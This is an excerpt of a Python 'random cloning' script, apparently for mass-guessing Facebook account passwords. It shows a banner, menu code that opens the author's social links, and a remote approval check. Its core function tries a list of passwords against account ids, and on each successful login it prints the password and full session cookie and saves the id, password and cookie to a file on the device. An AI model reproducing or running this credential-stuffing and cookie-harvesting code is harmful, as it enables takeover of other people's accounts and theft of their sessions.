...
®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®                                       
\033[1;92m  [+]===============================================[+]
\033[1;92m  [+]        CREATED BY   :  SK SHORIF              \033[1;92m[+]
\033[1;92m  [+]        ON GITHUB    :  SHORIF-IN              \033[1;92m[+]
\033[1;92m  [+]        TEAM         :  I,M KING               \033[1;92m[+]
\033[1;92m  [+]        TOOL VERSION :  0.5                    \033[1;92m[+]
\033[1;92m  [+]        TOOL STATUS  :  RANDOM CLONING         \033[1;92m[+]
\033[1;92m  [+]        COUNTRY      :  BANGLADESH             \033[1;92m[+]
\033[1;92m  [+]===============================================[+]""")
...
def Main():
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/hafejmdshoriful.shorif?mibextid=ZbWKwL');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://wa.me/+8801825801918');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def admin():
	...
	if bal =='2':
		...
		admin()
	if bal =='3':
		os.system('xdg-open https:/b.com/Mr-SHORIF-404');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSHORIF-👿\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [SHORIF-OK🔥] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💉]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/SHORIF-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Sk-kinhg/Aprov/blob/main/Aprov.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        ...
        os.system("xdg-open https://wa.me/+8801825801918")
        superuser()        
superuser()
